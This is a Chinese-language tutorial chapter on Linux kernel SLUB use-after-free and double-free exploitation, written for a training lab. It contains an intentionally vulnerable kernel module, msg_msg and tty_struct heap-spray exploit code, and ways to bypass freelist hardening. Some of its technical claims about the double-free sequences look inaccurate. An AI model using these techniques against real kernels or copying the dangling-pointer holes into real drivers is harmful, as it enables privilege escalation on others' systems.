# Ch 10 — UAF / Double Free：SLUB freelist corruption

> 目標：UAF 在 SLUB 上比 glibc heap 單純但更暴力 — free 完的 object 地址 **立刻** 被下一個同 cache 的 allocation 拿走。Double free 讓你覆蓋 freelist → 下一個 alloc 回來任意指標。這章是 Ch 11 spray 大全的跳板。

## UAF 在 SLUB 上為什麼致命

glibc heap 的 UAF 要走 tcache poisoning 或 house of 某某一堆步驟。SLUB 的 UAF 只需要：

1. `kfree(A)` — A 被 push 進 cpu_slab 的 freelist
2. `kmalloc(same_size)` — SLUB fast path pop A 回來
3. 新 allocation 拿到**同一塊記憶體**，內容初始**沒清零**

所以：

- **UAF write**：你還持有 A 的指標能寫 → 直接汙染 spray 進來的 victim 的 content
- **UAF read**：讀 A → 洩漏 spray 進來的 victim 的 content（info leak 大宗）

**比 glibc 任何 UAF 技巧都直接**。代價是「時機」— free 與 spray 之間的窗口要夠穩。

## 三種 UAF 實戰形態

### 形態 1：UAF Read → info leak

```
alloc A     (kmalloc-128, some pointer)
kfree(A)    (pointer 還留在 user-space，struct 在 freelist)
spray msg_msg with known content
read from the A pointer → 讀到 msg_msg 的 content
```

常用來 leak kernel 指標（msg_msg header 裡有 list_head 指標）。

### 形態 2：UAF Write → 覆寫 victim

```
alloc A
kfree(A)
spray tty_struct (kmalloc-1024, 大小得對)
write through A pointer → 寫 tty_struct 的 ops 欄位
ioctl on tty → hijack 到你的 ROP
```

這是 Ch 12 的主線。

### 形態 3：UAF → freelist 操控

free 完的 A 前 8 byte 是 freelist 指標。覆寫它 → 改 freelist → 下一次同 size alloc 被導向任意地址。

這要繞 SLAB_FREELIST_HARDENED（詳後）。

## Double Free：freelist 自己指自己

Double free 在 SLUB 上最直接的效果：

```
alloc A
kfree(A)   → freelist: A → (old head)
kfree(A)   → freelist: A → A → (old head)
             ^^^^^^^^^^^^^^^^^^^^^^
             A 指向自己，變成 cycle
```

之後兩次 alloc 都拿到 A，但**第三次** alloc 看 freelist[A] 就是 A 自己，又 pop A — 你拿到同一塊記憶體的兩個「合法」引用。

但 SLUB_FREELIST_HARDENED 會檢查：`kfree` 時會掃 freelist 看新加入的 node 是否已經在 freelist（近幾個）— 檢測 double free 直接 BUG_ON。

繞過：同 CPU 做 double free 會被抓、**切換 CPU 後再 free** 能繞過（cpu_slab 不同沒比對）。或 free 一次、alloc 回拿、free 第二次（兩次 free 中間被 reclaim，不是連續）。

## 最小 UAF module

```bash
mkdir -p ~/kpwn/module/ch10-uaf
cd ~/kpwn/module/ch10-uaf
```

`vuln.c`：

```c
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define N 16
static void *objs[N];

struct op { int idx; size_t len; char __user *buf; };
#define OP_ALLOC _IOW('v', 1, struct op)
#define OP_FREE  _IOW('v', 2, struct op)  /* 洞：不清 objs[idx] */
#define OP_READ  _IOR('v', 3, struct op)  /* 洞：不檢查 valid */
#define OP_WRITE _IOW('v', 4, struct op)  /* 洞：不檢查 valid */

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct op op;
    if (copy_from_user(&op, (void __user *)arg, sizeof(op))) return -EFAULT;
    if (op.idx < 0 || op.idx >= N) return -EINVAL;

    switch (cmd) {
    case OP_ALLOC:
        if (objs[op.idx]) return -EEXIST;
        objs[op.idx] = kmalloc(op.len, GFP_KERNEL);
        return objs[op.idx] ? 0 : -ENOMEM;
    case OP_FREE:
        /* 洞：kfree 後沒 NULL — dangling pointer */
        kfree(objs[op.idx]);
        return 0;
    case OP_READ:
        /* 洞：沒檢查 objs[idx] 是否還 live */
        if (copy_to_user(op.buf, objs[op.idx], op.len)) return -EFAULT;
        return 0;
    case OP_WRITE:
        if (copy_from_user(objs[op.idx], op.buf, op.len)) return -EFAULT;
        return 0;
    }
    return -ENOTTY;
}

static const struct file_operations fops = { .owner=THIS_MODULE, .unlocked_ioctl=vuln_ioctl };
static struct miscdevice md = { .minor=MISC_DYNAMIC_MINOR, .name="vuln", .fops=&fops, .mode=0666 };
static int __init m_init(void) { return misc_register(&md); }
static void __exit m_exit(void) {
    for (int i = 0; i < N; i++) objs[i] = NULL; /* 不 free — 讓它 leak，避免 double free */
    misc_deregister(&md);
}
module_init(m_init); module_exit(m_exit);
MODULE_LICENSE("GPL");
```

典型的「dangling pointer」型 UAF — `kfree` 沒把 `objs[idx]` 設 NULL，後續 read/write 還能透過這個 idx 存取已 free 的 chunk。

## 實作 UAF Read → leak msg_msg 指標

先預覽 `msg_msg` spray（Ch 11 細講）。`msg_msg` 是 System V message queue 的訊息結構，`msgsnd` syscall 會 `kmalloc` 一個：

```c
/* msg_msg header (簡化) */
struct msg_msg {
    struct list_head m_list;  /* 兩個指標 */
    long             m_type;
    size_t           m_ts;
    struct msg_msgseg *next;  /* 長訊息才有 */
    void             *security;
    /* 之後是 user payload */
};
```

`list_head` 裡面的 `next` 和 `prev` 指向 queue 裡其他 msg — 都是 **kernel heap 指標**。

### 步驟

```c
/* 1. 建 msgqueue */
int msqid = msgget(IPC_PRIVATE, 0666);

/* 2. alloc+free 我們的 obj */
ioctl(fd, OP_ALLOC, &(struct op){.idx=0, .len=64});
ioctl(fd, OP_FREE,  &(struct op){.idx=0, .len=0});

/* 3. msgsnd 一個 64-byte msg，會 kmalloc-64 剛好取回剛 free 的 chunk */
struct {
    long mtype;
    char mtext[64 - sizeof(struct msg_msg)];
} mbuf = { .mtype = 1 };
msgsnd(msqid, &mbuf, sizeof(mbuf.mtext), 0);

/* 4. 用 dangling objs[0] 讀 — 讀到 msg_msg 的 m_list！ */
char buf[64];
ioctl(fd, OP_READ, &(struct op){.idx=0, .len=64, .buf=buf});

/* buf[0..7] 是 m_list.next，指向 queue 的下一個元素 or head
   buf[8..15] 是 m_list.prev — 兩個都是 kernel heap 指標 */
unsigned long *p = (unsigned long*)buf;
printf("leak next: %016lx\n", p[0]);
printf("leak prev: %016lx\n", p[1]);
```

`m_list.next` 指向 `msg_queue` 結構（在 `msg_queue_cache` 裡），這給你 **direct map** 區的地址 — 搭配 KASLR memory 的 offset 反推 physmap base。

## 實作 UAF Write → 覆寫相鄰 object

典型題：拿 SLUB UAF 改 `struct cred` 的 uid。

```c
/* alloc 一個 kmalloc-192 的 chunk（cred 不在 kmalloc-N 但很多 audit_context 在） */
/* 或走 kmalloc-1024 打 tty_struct — Ch 12 主打 */
/* 這裡示意最簡 pattern */

ioctl(fd, OP_ALLOC, &(struct op){.idx=0, .len=1024});
ioctl(fd, OP_FREE,  &(struct op){.idx=0, .len=0});

/* spray tty_struct — 100 個 TIOCGPTPEER + ptmx 技巧 */
int tty_fds[200];
for (int i = 0; i < 200; i++) tty_fds[i] = open("/dev/ptmx", O_RDWR);

/* 有機率 dangling objs[0] 指向某個 tty_struct */
/* 覆寫 ops 欄位（tty_struct 的 ops 在 offset 0x18，就是 struct tty_struct 第四個欄位附近） */
char evil[1024] = {0};
/* 把 ops 指到 fake ops，裡面的 ioctl 是 ROP 入口 */
*(unsigned long*)(evil + 0x18) = fake_ops_addr;
ioctl(fd, OP_WRITE, &(struct op){.idx=0, .len=1024, .buf=evil});

/* ioctl 每個 tty_fd，看哪一個炸出我們的 ROP */
for (int i = 0; i < 200; i++)
    ioctl(tty_fds[i], 0xdeadbeef, 0);
```

這是 Ch 12 的完整題目，此章只為 preview。

## 繞 SLAB_FREELIST_HARDENED 改 freelist

`kfree` 時存入的 freelist pointer 是 `real_next XOR cookie XOR position`。cookie 是 boot 時隨機的 per-cache 值。

繞法有三：

### 方法 A：先 leak cookie

只要你能**讀到一個 free object 的前 8 byte**，你就有 `encoded = real_next XOR cookie XOR pos`。如果你知道 real_next（例如它是 NULL — freelist 末端），你反推 cookie。

實際上 leak freelist 指標很難（freelist 中的 obj 本身被你 read 就等於 spray 後 read，但 spray 物件本體就在那裡，前 8 byte 是它的 data 不是 freelist）。這條只能在特定情境用。

### 方法 B：不改 freelist，改「下一個」的 data

forget freelist hardening — 只要你 UAF write 打到**下一個** 還 in-use 的 object 的 data 欄位（例如覆寫 function pointer），就不經 freelist，直接打 in-use data。

### 方法 C：overflow 鄰居的 freelist pointer

如果 neighbor 是 free object，它的前 8 byte 是 encoded next。你 UAF write 時若 overflow 到 neighbor，可以**把 encoded 寫成你要的**，但你不知道 cookie 還是寫不對。除非你湊巧猜對（2^64 不可能）。

**結論**：現代 kernel 下「純改 freelist」路子越走越窄。主流改 **data-only**（改 in-use 的 function pointer、改 cred uid 等）。

## Double free 實戰

繞 FREELIST_HARDENED 的 double free 檢測：

```c
alloc(0, 128);
free(0);      /* 進 freelist：head → obj0 */
alloc(1, 128);  /* obj0 被取回，變 in-use */
free(1);      /* 這次 free 的是「alloc(1)」那次拿的地址 — 就是 obj0 */
/* kernel 看這次 free 跟上次相隔夠遠（中間有 alloc），不認為是 double free */
```

現在 obj0 在 freelist 裡**兩次**（透過 objs[0] 和 objs[1] 都指向它）。

## 常見踩雷

**spray 100 個 `msgsnd` 沒拿到 UAF chunk** — 1) 你 free 和 spray 不在同 CPU；2) 中間有其他 kernel alloc 插進 freelist；3) freelist 方向反了。pin CPU、加 padding alloc 到同 cache。

**UAF read 讀出全 0** — 沒 spray 到、或 spray 到的 object 是 zkalloc。確認你 spray 的是**同大小** + **同 cache**。

**double free panic：`kernel BUG at mm/slub.c:...`** — FREELIST_HARDENED 抓到了。把兩次 free 中間插 alloc 操作。

**UAF write 改 ops 後 ioctl 沒爆** — 1) 你沒寫到正確 offset（tty_struct 的 ops 位置要 pahole 驗）；2) 你 spray 的不是 tty_struct，是別的 kmalloc-1024 物件；3) CFI 開著擋你 indirect call。

## 動手練習

1. **寫出 UAF read 版 info leak**：用上面的 module + `msgsnd` spray，leak msg_msg 的 `m_list.next` 指標。算出 `msg_queue_cache` 在 direct map 的地址。
2. **驗證 `kfree` 不清指標這個行為**：在 OP_FREE 後跟著 OP_READ 同 idx，印出前 8 byte — 你應該看到 freelist pointer（被 cookie 加密了）。
3. **繞 FREELIST_HARDENED 雙 free**：寫個測試，連續 free 同一個 idx 兩次 vs 中間插一次 alloc 再 free 兩次。只有後者能繞。
4. **CPU affinity 對 spray 成功率的影響**：pin vs 不 pin，各跑 100 次 spray，統計成功率。
5. **讀 `mm/slub.c` 的 `free_to_partial_list` / `__slab_free`** — 看 SLUB 怎麼 push 進 freelist、怎麼檢測 double free。

## 自我檢核

- [ ] 能解釋 SLUB 的 UAF 為什麼「比 glibc heap 致命」
- [ ] 能寫出 UAF read 路徑（alloc-free-spray-read）的步驟
- [ ] 能寫出 UAF write 路徑（alloc-free-spray-write）的步驟
- [ ] 能描述 SLAB_FREELIST_HARDENED 擋的是什麼、擋不住什麼
- [ ] 能解釋「現代主流 heap exploit 走 data-only」的理由
- [ ] 知道繞 double-free detection 的策略：中間插 alloc

下一章是 heap exploit 的**查表章** — `msg_msg`、`sk_buff`、`pipe_buffer`、`tty_struct`、`seq_operations`、`user_key_payload` 各自的 size、怎麼 spray、能拿來做什麼（info leak / RIP 控制 / arbitrary R/W）。整理成一張對照表，寫 exploit 時查它就對了。

→ [Ch 11 — Heap Spray 物件大全](./11-spray-objects.md)
